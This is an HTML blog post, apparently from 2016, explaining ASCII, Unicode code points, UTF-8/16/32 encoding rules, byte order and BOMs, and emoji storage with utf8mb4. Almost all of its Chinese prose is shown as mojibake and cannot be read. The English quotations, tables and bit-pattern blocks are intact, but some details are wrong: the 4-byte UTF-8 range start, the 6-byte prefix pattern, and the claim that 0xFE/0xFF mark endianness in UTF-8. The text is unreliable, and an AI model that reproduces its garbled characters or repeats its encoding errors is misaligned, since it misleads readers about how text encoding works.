<p>ASCIIçš„å±€é™åœ¨äºåªèƒ½æ˜¾ç¤º26ä¸ªåŸºæœ¬æ‹‰ä¸å­—æ¯ã€é˜¿æ‹‰ä¼¯æ•°ç›®å­—å’Œè‹±å¼æ ‡ç‚¹ç¬¦å·ï¼Œå› æ­¤åªèƒ½ç”¨äºæ˜¾ç¤ºç°ä»£ç¾å›½è‹±è¯­ï¼ˆè€Œä¸”åœ¨å¤„ç†è‹±è¯­å½“ä¸­çš„å¤–æ¥è¯å¦‚naÃ¯veã€cafÃ©ã€Ã©liteç­‰ç­‰æ—¶ï¼Œæ‰€æœ‰é‡éŸ³ç¬¦å·éƒ½ä¸å¾—ä¸å»æ‰ï¼Œå³ä½¿è¿™æ ·åšä¼šè¿åæ‹¼å†™è§„åˆ™ï¼‰ã€‚è€ŒEASCIIè™½ç„¶è§£å†³äº†éƒ¨åˆ†è¥¿æ¬§è¯­è¨€çš„æ˜¾ç¤ºé—®é¢˜ï¼Œä½†å¯¹æ›´å¤šå…¶ä»–è¯­è¨€ä¾ç„¶æ— èƒ½ä¸ºåŠ›ã€‚å› æ­¤ç°åœ¨çš„è½¯ä»¶ç³»ç»Ÿå¤§å¤šé‡‡ç”¨Unicodeã€‚</p>
</blockquote>
<p>åç»­æœ‰å…¶æ‰©å±•ç‰ˆæœ¬<code>EASCII</code>ã€‚è¿™ä¸ªæ‰©å±•çš„ç‰ˆæœ¬è™½ç„¶æ‰©å……äº†ä¸€äº›å­—ç¬¦ï¼Œå¢å¤§äº†EASCIIçš„è¡¨è¾¾èƒ½åŠ›ï¼Œä½†æ˜¯ä»ä¸èƒ½æ»¡è¶³å…¨çƒå„ä¸ªå›½å®¶çš„éœ€æ±‚ã€‚äºæ˜¯å„ä¸ªå›½å®¶å°±è‡ªå·±æäº†ä¸€å¥—ç¼–ç çš„è§„åˆ™ï¼Œä½†æ˜¯éšç€webçš„å‘å±•ï¼Œè¶Šæ¥è¶Šéœ€è¦ä¸€å¥—ç»Ÿä¸€çš„ç¼–è§£ç æ ‡å‡†ï¼Œäºæ˜¯Unicodeåº”è¿è€Œå‡ºã€‚</p>
<h3 id="Unicodeç¼–ç "><a href="#Unicodeç¼–ç " class="headerlink" title="Unicodeç¼–ç "></a>Unicodeç¼–ç </h3><img src="/2016/09/26/character-encoding/Unicode_logo.jpg">
<blockquote>
<p>Unicode provides a unique number for every character,<br>no matter what the platform,<br>no matter what the program,<br>no matter what the language.</p>
</blockquote>
<p>å®šä¹‰ï¼š</p>
<blockquote>
<p>Unicodeï¼ˆä¸­æ–‡ï¼šä¸‡å›½ç ã€å›½é™…ç ã€ç»Ÿä¸€ç ã€å•ä¸€ç ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†ã€‚å®ƒå¯¹ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†çš„æ–‡å­—ç³»ç»Ÿè¿›è¡Œäº†æ•´ç†ã€ç¼–ç ï¼Œä½¿å¾—ç”µè„‘å¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æ–¹å¼æ¥å‘ˆç°å’Œå¤„ç†æ–‡å­—ã€‚</p>
</blockquote>
<h4 id="code-point"><a href="#code-point" class="headerlink" title="code point"></a><strong>code point</strong></h4><blockquote>
<p>In Unicode, a character is dened as the smallest component of a written language that has semantic value.<br>The number assigned to a character is called a <strong>code point</strong>. A code point is denoted by U+ following by a<br>hexadecimal number from 4 to 8 digits long. Most of the code points in use are 4 digits long. For example,<br><code>U+03C6</code> is the code point for the Greek character f.</p>
</blockquote>
<img src="/2016/09/26/character-encoding/unicode-layout.jpg">
<blockquote>
<p>åœ¨æ–‡å­—å¤„ç†æ–¹é¢ï¼Œç»Ÿä¸€ç ä¸ºæ¯ä¸€ä¸ªå­—ç¬¦è€Œéå­—å½¢å®šä¹‰å”¯ä¸€çš„ä»£ç ï¼ˆå³ä¸€ä¸ªæ•´æ•°ï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œç»Ÿä¸€ç ä»¥ä¸€ç§æŠ½è±¡çš„æ–¹å¼ï¼ˆå³æ•°å­—ï¼‰æ¥å¤„ç†å­—ç¬¦ï¼Œå¹¶å°†è§†è§‰ä¸Šçš„æ¼”ç»å·¥ä½œï¼ˆä¾‹å¦‚å­—ä½“å¤§å°ã€å¤–è§‚å½¢çŠ¶ã€å­—ä½“å½¢æ€ã€æ–‡ä½“ç­‰ï¼‰ç•™ç»™å…¶ä»–è½¯ä»¶æ¥å¤„ç†ï¼Œä¾‹å¦‚ç½‘é¡µæµè§ˆå™¨æˆ–æ˜¯æ–‡å­—å¤„ç†å™¨ã€‚</p>
</blockquote>
<h4 id="Javaä¸­åˆ¤æ–­æ˜¯å¦æ˜¯ä¸­æ–‡å­—ç¬¦"><a href="#Javaä¸­åˆ¤æ–­æ˜¯å¦æ˜¯ä¸­æ–‡å­—ç¬¦" class="headerlink" title="Javaä¸­åˆ¤æ–­æ˜¯å¦æ˜¯ä¸­æ–‡å­—ç¬¦"></a>Javaä¸­åˆ¤æ–­æ˜¯å¦æ˜¯ä¸­æ–‡å­—ç¬¦</h4><blockquote>
<p>Javaåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦æœ‰ä¸­æ–‡ä¸€èˆ¬æƒ…å†µæ˜¯åˆ©ç”¨Unicodeç¼–ç (CJKç»Ÿä¸€æ±‰å­—çš„ç¼–ç åŒºé—´ï¼š0x4e00â€“0x9fbb)çš„æ­£åˆ™æ¥åšåˆ¤æ–­ï¼Œä½†æ˜¯å…¶å®è¿™ä¸ªåŒºé—´æ¥åˆ¤æ–­ä¸­æ–‡ä¸æ˜¯éå¸¸ç²¾ç¡®ï¼Œå› ä¸ºæœ‰äº›ä¸­æ–‡çš„æ ‡ç‚¹ç¬¦å·æ¯”å¦‚ï¼šï¼Œã€‚ç­‰ç­‰æ˜¯ä¸èƒ½è¯†åˆ«çš„ã€‚</p>
</blockquote>
<p>å…·ä½“çš„å‚è§å‚è€ƒä¸­çš„<code>Java å®Œç¾åˆ¤æ–­ä¸­æ–‡å­—ç¬¦</code></p>
<h4 id="é—ç•™çš„é—®é¢˜"><a href="#é—ç•™çš„é—®é¢˜" class="headerlink" title="é—ç•™çš„é—®é¢˜"></a>é—ç•™çš„é—®é¢˜</h4><blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUnicodeåªæ˜¯ä¸€ä¸ªç¬¦å·é›†ï¼Œå®ƒåªè§„å®šäº†ç¬¦å·çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå´æ²¡æœ‰è§„å®šè¿™ä¸ªäºŒè¿›åˆ¶ä»£ç åº”è¯¥å¦‚ä½•å­˜å‚¨ã€‚</p>
</blockquote>
<p>å­˜å‚¨ä¸­å­˜åœ¨çš„é—®é¢˜ï¼š</p>
<ol>
<li><p>å¦‚ä½•åŒºåˆ†Unicodeå’ŒASCIIç ï¼Ÿ</p>
</li>
<li><p>å¦‚ä½•å­˜å‚¨èƒ½èŠ‚çœç©ºé—´ï¼Ÿ</p>
</li>
</ol>
<blockquote>
<p>å®ƒä»¬é€ æˆçš„ç»“æœæ˜¯ï¼š</p>
</blockquote>
<blockquote>
<p>1ï¼‰å‡ºç°äº†Unicodeçš„å¤šç§å­˜å‚¨æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰è®¸å¤šç§ä¸åŒçš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¯ä»¥ç”¨æ¥è¡¨ç¤ºUnicodeã€‚</p>
</blockquote>
<blockquote>
<p>2ï¼‰Unicodeåœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ— æ³•æ¨å¹¿ï¼Œç›´åˆ°äº’è”ç½‘çš„å‡ºç°ã€‚</p>
</blockquote>
<ul>
<li>CJK</li>
</ul>
<blockquote>
<p>Q: What does the term â€œCJKâ€ mean?</p>
</blockquote>
<blockquote>
<p>A: It is a commonly used acronym for â€œChinese, Japanese, and Koreanâ€. The term â€œCJK characterâ€ generally refers to â€œChinese charactersâ€, or more specifically, the Chinese (= Han) ideographs used in the writing systems of the Chinese and Japanese languages, occasionally for Korean, and historically in Vietnam.</p>
</blockquote>
<h2 id="Character-encodingï¼ˆå­—ç¬¦ç¼–ç ï¼‰"><a href="#Character-encodingï¼ˆå­—ç¬¦ç¼–ç ï¼‰" class="headerlink" title="Character encodingï¼ˆå­—ç¬¦ç¼–ç ï¼‰"></a>Character encodingï¼ˆå­—ç¬¦ç¼–ç ï¼‰</h2><blockquote>
<p>å­—ç¬¦ç¼–ç ï¼ˆè‹±è¯­ï¼šCharacter encodingï¼‰ã€å­—é›†ç æ˜¯æŠŠå­—ç¬¦é›†ä¸­çš„å­—ç¬¦ç¼–ç ä¸ºæŒ‡å®šé›†åˆä¸­æŸä¸€å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼šæ¯”ç‰¹æ¨¡å¼ã€è‡ªç„¶æ•°åºåˆ—ã€8ä½ç»„æˆ–è€…ç”µè„‰å†²ï¼‰ï¼Œä»¥ä¾¿æ–‡æœ¬åœ¨è®¡ç®—æœºä¸­å­˜å‚¨å’Œé€šè¿‡é€šä¿¡ç½‘ç»œçš„ä¼ é€’ã€‚</p>
</blockquote>
<img src="/2016/09/26/character-encoding/relation.png">
<p><strong>code point</strong>:</p>
<blockquote>
<p>A code point is encoded as a sequence of integers (called code units), whose bit size depends upon the selected character encoding.</p>
</blockquote>
<table>
<thead>
<tr>
<th>Character Encoding</th>
<th>Code Unit</th>
<th>size</th>
<th>Encoded value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>UTF-8</td>
<td>8-bit</td>
<td>0xF0 0x9D 0x84 0x9E</td>
<td>4 bytes.</td>
<td>A sequence of 4 code units each 8-bits in length</td>
</tr>
<tr>
<td>UTF-16</td>
<td>16-bit</td>
<td>0xD834 0xDD1E</td>
<td>4 bytes.</td>
<td>A sequence of 2 code units each 16-bits in length</td>
</tr>
<tr>
<td>UTF-32</td>
<td>32-bit</td>
<td>0x0001D11E</td>
<td>4 bytes.</td>
<td>A sequence of 1 code units each 32-bits in length</td>
</tr>
</tbody>
</table>
<h3 id="UTF-8ç¼–ç "><a href="#UTF-8ç¼–ç " class="headerlink" title="UTF-8ç¼–ç "></a>UTF-8ç¼–ç </h3><blockquote>
<p>äº’è”ç½‘çš„æ™®åŠï¼Œå¼ºçƒˆè¦æ±‚å‡ºç°ä¸€ç§ç»Ÿä¸€çš„ç¼–ç æ–¹å¼ã€‚<strong>UTF-8å°±æ˜¯åœ¨äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿çš„ä¸€ç§Unicodeçš„å®ç°æ–¹å¼ã€‚</strong>å…¶ä»–å®ç°æ–¹å¼è¿˜åŒ…æ‹¬UTF-16ï¼ˆå­—ç¬¦ç”¨ä¸¤ä¸ªå­—èŠ‚æˆ–å››ä¸ªå­—èŠ‚è¡¨ç¤ºï¼‰å’ŒUTF-32ï¼ˆå­—ç¬¦ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºï¼‰ï¼Œä¸è¿‡åœ¨äº’è”ç½‘ä¸ŠåŸºæœ¬ä¸ç”¨ã€‚é‡å¤ä¸€éï¼Œè¿™é‡Œçš„å…³ç³»æ˜¯ï¼ŒUTF-8æ˜¯Unicodeçš„å®ç°æ–¹å¼ä¹‹ä¸€ã€‚</p>
</blockquote>
<h4 id="8çš„å«ä¹‰"><a href="#8çš„å«ä¹‰" class="headerlink" title="8çš„å«ä¹‰"></a>8çš„å«ä¹‰</h4><blockquote>
<p>unicodeåœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ— æ³•æ¨å¹¿ï¼Œç›´åˆ°äº’è”ç½‘çš„å‡ºç°ï¼Œä¸ºè§£å†³unicodeå¦‚ä½•åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„é—®é¢˜ï¼Œäºæ˜¯é¢å‘ä¼ è¾“çš„ä¼—å¤š <strong>UTFï¼ˆUCS Transfer Formatï¼‰æ ‡å‡†å‡ºç°äº†ï¼Œé¡¾åæ€ä¹‰ï¼ŒUTF-8å°±æ˜¯æ¯æ¬¡8ä¸ªä½ä¼ è¾“æ•°æ®ï¼Œè€ŒUTF-16å°±æ˜¯æ¯æ¬¡16ä¸ªä½ã€‚</strong>UTF-8å°±æ˜¯åœ¨äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿çš„ä¸€ç§unicodeçš„å®ç°æ–¹å¼ï¼Œè¿™æ˜¯ä¸ºä¼ è¾“è€Œè®¾è®¡çš„ç¼–ç ï¼Œå¹¶ä½¿ç¼–ç æ— å›½ç•Œï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºå…¨ä¸–ç•Œä¸Šæ‰€æœ‰æ–‡åŒ–çš„å­—ç¬¦äº†ã€‚</p>
</blockquote>
<p><strong>Code Unit</strong>:</p>
<ul>
<li>UTF-8çš„8æŒ‡çš„å°±æ˜¯æœ€å°ä¸º8ä½ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå³ä¸€å­—èŠ‚ä¸ºä¸€ä¸ªå•å…ƒï¼ŒUTF-8å¯ä»¥åŒ…å«ä¸€ä¸ªå•å…ƒï¼ŒäºŒä¸ªå•å…ƒï¼Œä¸‰ä¸ªå•å…ƒåŠå››ä¸ªå•å…ƒï¼Œå¯¹åº”å³æ˜¯ä¸€ï¼ŒäºŒï¼Œä¸‰åŠå››å­—èŠ‚ã€‚</li>
<li>UTF-16çš„16æŒ‡çš„å°±æ˜¯æœ€å°ä¸º16ä½ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå³ä¸¤å­—èŠ‚ä¸ºä¸€ä¸ªå•å…ƒï¼ŒUTF-16å¯ä»¥åŒ…å«ä¸€ä¸ªå•å…ƒå’Œä¸¤ä¸ªå•å…ƒï¼Œå¯¹åº”å³æ˜¯ä¸¤ä¸ªå­—èŠ‚å’Œå››ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬æ“ä½œUTF-16æ—¶å°±æ˜¯ä»¥å®ƒçš„ä¸€ä¸ªå•å…ƒä¸ºåŸºæœ¬å•ä½çš„ã€‚</li>
<li>åŒç†ï¼ŒUTF-32ä»¥32ä½ä¸€ä¸ªå•å…ƒï¼Œå®ƒåªåŒ…å«è¿™ä¸€ç§å•å…ƒå°±å¤Ÿäº†ï¼Œå®ƒçš„ä¸€å•å…ƒè‡ªç„¶ä¹Ÿå°±æ˜¯å››å­—èŠ‚äº†ã€‚</li>
</ul>
<h4 id="UTF-8å’ŒUnicode"><a href="#UTF-8å’ŒUnicode" class="headerlink" title="UTF-8å’ŒUnicode"></a>UTF-8å’ŒUnicode</h4><img src="/2016/09/26/character-encoding/encoding.png">
<blockquote>
<p>UTF-8æœ€å¤§çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯å®ƒæ˜¯ä¸€ç§å˜é•¿çš„ç¼–ç æ–¹å¼ã€‚å®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œæ ¹æ®ä¸åŒçš„ç¬¦å·è€Œå˜åŒ–å­—èŠ‚é•¿åº¦ï¼Œå½“å­—ç¬¦åœ¨ASCII ç çš„èŒƒå›´æ—¶ï¼Œå°±ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œä¿ç•™äº†ASCIIå­—ç¬¦ä¸€ä¸ªå­—èŠ‚çš„ç¼–ç åšä¸ºå®ƒçš„ä¸€éƒ¨åˆ†ï¼Œæ³¨æ„çš„æ˜¯unicodeä¸€ä¸ªä¸­æ–‡å­—ç¬¦å 2ä¸ªå­—èŠ‚ï¼Œè€ŒUTF-8ä¸€ä¸ªä¸­ æ–‡å­—ç¬¦å 3ä¸ªå­—èŠ‚ï¼‰ã€‚ä»unicodeåˆ°uft-8å¹¶ä¸æ˜¯ç›´æ¥çš„å¯¹åº”ï¼Œè€Œæ˜¯è¦è¿‡ä¸€äº›ç®—æ³•å’Œè§„åˆ™æ¥è½¬æ¢ã€‚</p>
</blockquote>
<h4 id="ç¼–ç æ–¹å¼"><a href="#ç¼–ç æ–¹å¼" class="headerlink" title="ç¼–ç æ–¹å¼"></a>ç¼–ç æ–¹å¼</h4><blockquote>
<p>UTF-8çš„ç¼–ç è§„åˆ™å¾ˆç®€å•ï¼Œåªæœ‰äºŒæ¡ï¼š</p>
</blockquote>
<blockquote>
<p>1ï¼‰å¯¹äºå•å­—èŠ‚çš„ç¬¦å·ï¼Œå­—èŠ‚çš„ç¬¬ä¸€ä½è®¾ä¸º0ï¼Œåé¢7ä½ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚å› æ­¤å¯¹äºè‹±è¯­å­—æ¯ï¼ŒUTF-8ç¼–ç å’ŒASCIIç æ˜¯ç›¸åŒçš„ã€‚</p>
</blockquote>
<blockquote>
<p>2ï¼‰å¯¹äºnå­—èŠ‚çš„ç¬¦å·ï¼ˆn&gt;1ï¼‰ï¼Œ<strong>ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰nä½éƒ½è®¾ä¸º1ï¼Œç¬¬n+1ä½è®¾ä¸º0ï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½ä¸€å¾‹è®¾ä¸º10</strong>ã€‚å‰©ä¸‹çš„æ²¡æœ‰æåŠçš„äºŒè¿›åˆ¶ä½ï¼Œå…¨éƒ¨ä¸ºè¿™ä¸ªç¬¦å·çš„unicodeç ã€‚</p>
</blockquote>
<p>æ‰€ä»¥å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>0</code>å¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±æ˜¯å…¼å®¹ASCIIç çš„å•å­—èŠ‚å­—ç¬¦ï¼›å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>1</code>å¼€å¤´çš„å°±æ˜¯å¤šå­—èŠ‚å­—ç¬¦ï¼Œæ•°ä¸€æ•°å‰é¢æœ‰å¤šå°‘ä¸ª<code>1</code>ï¼Œå°±çŸ¥é“è¿™ä¸ªå­—ç¬¦å äº†å‡ ä¸ªå­—èŠ‚ã€‚</p>
<p>æ‰€ä»¥UTF-8ç¼–ç åçš„äºŒè¿›åˆ¶å½¢å¼åº”è¯¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0xxxxxxx 1ä¸ªbyte</span><br><span class="line"></span><br><span class="line">110xxxxx 10xxxxxx 2ä¸ªbyte</span><br><span class="line"></span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx 3ä¸ªbyte</span><br><span class="line"></span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 4ä¸ªbyte</span><br><span class="line"></span><br><span class="line">111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 5ä¸ªbyte</span><br><span class="line"></span><br><span class="line">111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 6ä¸ªbyte</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The bytes <code>0xFE(11111110)</code> and <code>0xFF(11111111)</code> are never used in the UTF-8 encoding.</p>
</blockquote>
<p>è¿™ä¸¤ä¸ªç‰¹æ®Šçš„å­—èŠ‚è¢«ç”¨æ¥æ ‡ç¤ºæ˜¯å¤§ç«¯ç¼–ç å’Œå°ç«¯ç¼–ç </p>
<p>UTF-8ç¼–ç çš„èŒƒå›´å’ŒUnicodeå¯¹åº”çš„å…³ç³»å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æ€»æ¯”ç‰¹æ•°</th>
<th>Code Pointå çš„ä½æ•°</th>
<th>èŒƒå›´</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>7</td>
<td>00000000 - 0000007F</td>
</tr>
<tr>
<td>2</td>
<td>11</td>
<td>00000080 - 000007FF</td>
</tr>
<tr>
<td>3</td>
<td>16</td>
<td>00000800 - 0000FFFF</td>
</tr>
<tr>
<td>4</td>
<td>21</td>
<td>00001000 - 001FFFFF</td>
</tr>
<tr>
<td>5</td>
<td>26</td>
<td>00200000 - 03FFFFFF</td>
</tr>
<tr>
<td>6</td>
<td>31</td>
<td>04000000 - FFFFFFFF</td>
</tr>
</tbody>
</table>
<p>ç¼–ç ç¤ºä¾‹ï¼š</p>
<p><code>U+05E7</code> ä½¿ç”¨<code>UTF-8</code>ç¼–ç ç¤ºä¾‹:</p>
<ol>
<li><p>æŸ¥ä¸Šè¡¨å¾—çŸ¥ï¼Œ <code>05E7</code>åœ¨ <code>0080 - 07FF</code> èŒƒå›´å†…ï¼Œæ€»å…±å 2ä¸ªå­—èŠ‚<br>åº”è¯¥æ˜¯ç±»ä¼¼ <code>110xxxxx 10xxxxxx</code></p>
</li>
<li><p>å°†å…¶å†™æˆäºŒè¿›åˆ¶å½¢å¼ï¼Œ<code>0000 0101 1110 0111</code></p>
</li>
<li><p>å°†æ•°æ®æ›¿æ¢ä¸Šè¿°çš„<code>x</code>ï¼Œå¾—åˆ° <code>11010111 10100111 = 0xD7A7</code></p>
</li>
</ol>
<ul>
<li>å­—èŠ‚åº</li>
</ul>
<p>UTF-8æœ€å¤šä½¿ç”¨6ä¸ªbyteè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œäºæ˜¯å°±å­˜åœ¨ä¸€ä¸ªå­—èŠ‚åºçš„é—®é¢˜ã€‚<br>å­—èŠ‚åºåˆ†ä¸ºä¸¤ç§ï¼š</p>
<ol>
<li><strong>Little-Endian</strong>:<br>å­—èŠ‚åºä½ä½åœ¨å‰  å°å°¾ åœ¨æ“ä½œç³»ç»Ÿä¸Šå¾ˆå¸¸ç”¨ï¼Œä¹Ÿæ˜¯è®¡ç®—æœºç³»ç»Ÿä¸Šæœ€å¸¸ç”¨çš„å­—èŠ‚åº</li>
<li><strong>Big-Endian</strong>: å­—èŠ‚åºé«˜ä½åœ¨å‰ å¤§å°¾  ä¹Ÿç§°ä¸ºç½‘ç»œå­—èŠ‚åº</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">16è¿›åˆ¶æ•°å­—0x12345678ï¼Œlittle-endiançš„å­˜å‚¨ä¸º:Â  0x78 0x56 0x34 0x12Â Â Â Â  åœ°å€ä¾æ¬¡ä¸º100, 101, 102, 103</span><br><span class="line"></span><br><span class="line">16è¿›åˆ¶æ•°å­—0x12345678ï¼Œbig-endiançš„å­˜å‚¨ä¸º:Â Â    0x12 0x34 0x56 0x78Â Â Â Â    åœ°å€ä¾æ¬¡ä¸º100, 101, 102, 103</span><br></pre></td></tr></table></figure>
<blockquote>
<p>â€œendianâ€è¿™ä¸ªè¯å‡ºè‡ªã€Šæ ¼åˆ—ä½›æ¸¸è®°ã€‹ã€‚å°äººå›½çš„å†…æˆ˜å°±æºäºåƒé¸¡è›‹æ—¶æ˜¯ç©¶ç«Ÿä»å¤§å¤´(Big-Endian)æ•²å¼€è¿˜æ˜¯ä»å°å¤´(Little-Endian)æ•²å¼€ï¼Œç”±æ­¤æ›¾å‘ç”Ÿè¿‡å…­æ¬¡å›ä¹±ï¼Œå…¶ä¸­ä¸€ä¸ªçš‡å¸é€äº†å‘½ï¼Œå¦ä¸€ä¸ªä¸¢äº†ç‹ä½ã€‚</p>
</blockquote>
<ul>
<li>å­—èŠ‚åºç”¨é€”<blockquote>
<p>Little-Endianæœ€å¸¸ç”¨ï¼Œå¤§éƒ¨åˆ†ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿï¼ˆå¦‚windows, FreeBsd,Linuxï¼‰æ˜¯Little Endiançš„ã€‚</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>Big-Endianæœ€å¸¸ç”¨åœ¨ç½‘ç»œåè®®ä¸Šï¼Œä¾‹å¦‚TCP/IPåè®®ä½¿ç”¨çš„æ˜¯big endian. æ“ä½œç³»ç»Ÿä¸Šå¦‚MAC OS ,æ˜¯Big Endian çš„ã€‚<br>æœ¬è´¨ä¸Šè¯´ï¼ŒLittle Endianè¿˜æ˜¯Big Endianä¸æ“ä½œç³»ç»Ÿå’ŒèŠ¯ç‰‡ç±»å‹éƒ½æœ‰å…³ç³»ã€‚PowerPCç³»åˆ—é‡‡ç”¨big endianæ–¹å¼å­˜å‚¨æ•°æ®ï¼Œx86ç³»åˆ—åˆ™é‡‡ç”¨little endianæ–¹å¼å­˜å‚¨æ•°æ®ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BigÂ Endian</span><br><span class="line">Â Â Â ä½åœ°å€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â é«˜åœ°å€</span><br><span class="line">Â Â  -----------------------------------------&gt;</span><br><span class="line">Â Â  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">Â Â  |Â Â Â Â  12Â Â Â Â  |Â Â Â Â Â Â 34Â Â Â  |Â Â Â Â Â 56Â Â Â Â Â Â |Â Â Â Â  78Â Â Â  |</span><br><span class="line">Â Â  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">Little Endian</span><br><span class="line">Â Â Â ä½åœ°å€Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â é«˜åœ°å€</span><br><span class="line">Â Â  -----------------------------------------&gt;</span><br><span class="line">Â Â  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">Â Â  |Â Â Â Â Â 78Â Â Â Â  |Â Â Â Â Â Â 56Â Â Â  |Â Â Â Â Â 34Â Â Â Â Â Â |Â Â Â Â Â 12Â Â Â  |</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Unicodeè§„èŒƒä¸­å®šä¹‰ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶çš„æœ€å‰é¢åˆ†åˆ«åŠ å…¥ä¸€ä¸ªè¡¨ç¤ºç¼–ç é¡ºåºçš„å­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦çš„åå­—å«åšâ€é›¶å®½åº¦éæ¢è¡Œç©ºæ ¼â€ï¼ˆZERO WIDTH NO-BREAK SPACEï¼‰ï¼Œç”¨FEFFè¡¨ç¤ºã€‚è¿™æ­£å¥½æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œä¸”FFæ¯”FEå¤§1ã€‚<br>å¦‚æœä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å¤´ä¸¤ä¸ªå­—èŠ‚æ˜¯FE FFï¼Œå°±è¡¨ç¤ºè¯¥æ–‡ä»¶é‡‡ç”¨å¤§å¤´æ–¹å¼ï¼›å¦‚æœå¤´ä¸¤ä¸ªå­—èŠ‚æ˜¯FF FEï¼Œå°±è¡¨ç¤ºè¯¥æ–‡ä»¶é‡‡ç”¨å°å¤´æ–¹å¼ã€‚</p>
</blockquote>
<h2 id="å±•ç¤º"><a href="#å±•ç¤º" class="headerlink" title="å±•ç¤º"></a>å±•ç¤º</h2><p>å±•ç¤ºå°±æ˜¯è½¯ä»¶ç›¸å…³çš„äº†ï¼Œ ä¸åŒçš„å­—ä½“æ¸²æŸ“å‡ºæ¥çš„ä¹Ÿä¸ä¸€æ ·</p>
<img src="/2016/09/26/character-encoding/glyphs.png" title="Fonts map the same code point to different glyphs">
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><img src="/2016/09/26/character-encoding/emoji.jpg">
<p>emojiè¡¨æƒ…é‡‡ç”¨çš„æ˜¯ Unicodeç¼–ç ï¼ŒEmojiå°±æ˜¯ä¸€ç§åœ¨Unicodeä½äº<code>\u1F601-\u1F64F</code>åŒºæ®µçš„å­—ç¬¦ã€‚è¿™ä¸ªæ˜¾ç„¶è¶…è¿‡äº†ç›®å‰å¸¸ç”¨çš„UTF-8å­—ç¬¦é›†çš„ç¼–ç èŒƒå›´<code>\u0000-\uFFFF</code>ã€‚</p>
<p>ä½¿ç”¨utf8mb4ç¼–ç ä¾¿å¯ä»¥è§£å†³ä¸Šè¿°çš„é—®é¢˜</p>
